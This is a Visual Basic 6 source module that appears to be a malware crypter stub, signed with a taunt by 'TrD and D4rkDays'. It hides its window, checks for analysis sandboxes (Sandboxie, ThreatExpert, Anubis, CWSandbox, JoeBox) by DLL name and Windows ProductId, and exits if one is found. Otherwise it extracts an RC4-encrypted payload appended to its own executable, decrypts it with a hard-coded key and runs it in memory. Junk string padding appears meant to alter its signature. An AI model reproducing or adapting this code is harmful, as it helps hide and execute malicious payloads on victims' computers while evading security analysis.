Attribute VB_Name = "MainStart"
Public Const HELLO_MOTHERFUCKS = "This is by TrD and D4rkDays so bow to us biatch"
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Private Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8
Private Type MODULEENTRY32
dwSize As Long
th32ModuleID As Long
th32ProcessID As Long
GlblcntUsage As Long
ProccntUsage As Long
modBaseAddr As Byte
modBaseSize As Long
hModule As Long
szModule As String * 256
szExePath As String * 1024
End Type

Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
On Error Resume Next
Dim RB(0 To 255) As Integer, X As Long, Y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(Password) = 0 Then
Exit Function
End If
If Len(Expression) = 0 Then
Exit Function
End If
If Len(Password) > 256 Then
Key() = StrConv(Left$(Password, 256), vbFromUnicode)
Else
Key() = StrConv(Password, vbFromUnicode)
End If
For X = 0 To 255
RB(X) = X
Next X
X = 0
Y = 0
Z = 0
For X = 0 To 255
Y = (Y + RB(X) + Key(X Mod Len(Password))) Mod 256
Temp = RB(X)
RB(X) = RB(Y)
RB(Y) = Temp
Next X
X = 0
Y = 0
Z = 0
ByteArray() = StrConv(Expression, vbFromUnicode)
For X = 0 To Len(Expression)
Y = (Y + 1) Mod 256
Z = (Z + RB(Y)) Mod 256
Temp = RB(Y)
RB(Y) = RB(Z)
RB(Z) = Temp
ByteArray(X) = ByteArray(X) Xor (RB((RB(Y) + RB(Z)) Mod 256))
Next X
RC4 = StrConv(ByteArray, vbUnicode)
End Function

    Public Function LettersToExe(ByVal sStr As String) As Byte()
Dim i As Long
Dim Buffer() As Byte
    ReDim Buffer(Len(sStr) - 1)
    For i = 1 To Len(sStr)
        Buffer(i - 1) = Asc(Mid(sStr, i, 1))
    Next i
    LettersToExe = Buffer
End Function

Sub Main()
On Error Resume Next
Dim DarkDays As String
DarkDays = ""
For o = 1 To 50
DarkDays = DarkDays & "!"
DarkDays = DarkDays & "1"
DarkDays = DarkDays & "2"
DarkDays = DarkDays & "sdf"
DarkDays = DarkDays & "s"
DarkDays = DarkDays & "!df"
DarkDays = DarkDays & "!"
DarkDays = DarkDays & "f"
DarkDays = DarkDays & "!d"
DarkDays = DarkDays & "!f"
DarkDays = DarkDays & "!g"
DarkDays = DarkDays & "g!"
DarkDays = DarkDays & "!f"
DarkDays = DarkDays & "h!"
DarkDays = DarkDays & "!h"
DarkDays = DarkDays & "f!"
DarkDays = DarkDays & "!f"
DarkDays = DarkDays & "m!"
DarkDays = DarkDays & "!m"
DarkDays = DarkDays & "n!"
DarkDays = DarkDays & "!"
DarkDays = DarkDays & "!,"
DarkDays = DarkDays & "!k"
DarkDays = DarkDays & "u!"
DarkDays = DarkDays & "!i"
DarkDays = DarkDays & "!y"
DarkDays = DarkDays & "!d"
DarkDays = DarkDays & "!a"
DarkDays = DarkDays & "!c"
DarkDays = DarkDays & "!i"
Next o
Dim Pass As String
Pass = "darkdays"
Dim iFileNum As Integer
Dim TemporaryBuff As String
Dim TemporaryNext() As String
App.TaskVisible = False
If IsInSandbox = True Then
Exit Sub
End If
iFileNum = FreeFile
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #iFileNum
TemporaryBuff = Space(LOF(iFileNum))
Get #iFileNum, , TemporaryBuff
Close #iFileNum
TemporaryNext = Split(TemporaryBuff, "#####")
'TemporaryNext = InStrRev(TemporaryBuff, "#####")
TemporaryBuff = TemporaryNext(1)
TemporaryBuff = RC4(TemporaryBuff, Pass)
Call ExecuteInMem(LettersToExe(TemporaryBuff))
End Sub

Public Function IsInSandbox() As Boolean
Dim hKey As Long, hOpen As Long, hQuery As Long, hSnapShot As Long
Dim me32 As MODULEENTRY32
Dim szBuffer As String * 128
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId)
me32.dwSize = Len(me32)
Module32First hSnapShot, me32
Do While Module32Next(hSnapShot, me32) <> 0
If InStr(1, LCase(me32.szModule), "sbiedll.dll") > 0 Then 'Sandboxie
IsInSandbox = True
ElseIf InStr(1, LCase(me32.szModule), "dbghelp.dll") > 0 Then 'ThreatExpert
IsInSandbox = True
End If
Loop
CloseHandle (hSnapShot)
If IsInSandbox = False Then
hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, hKey)
If hOpen = 0 Then
hQuery = RegQueryValueEx(hKey, "ProductId", 0, REG_SZ, szBuffer, 128)
If hQuery = 0 Then
If InStr(1, szBuffer, "76487-337-8429955-22614") > 0 Then 'Anubis
IsInSandbox = True
ElseIf InStr(1, szBuffer, "76487-644-3177037-23510") > 0 Then 'CWSandbox
IsInSandbox = True
ElseIf InStr(1, szBuffer, "55274-640-2673064-23950") > 0 Then 'JoeBox
IsInSandbox = True
End If
End If
End If
RegCloseKey (hKey)
End If
End Function
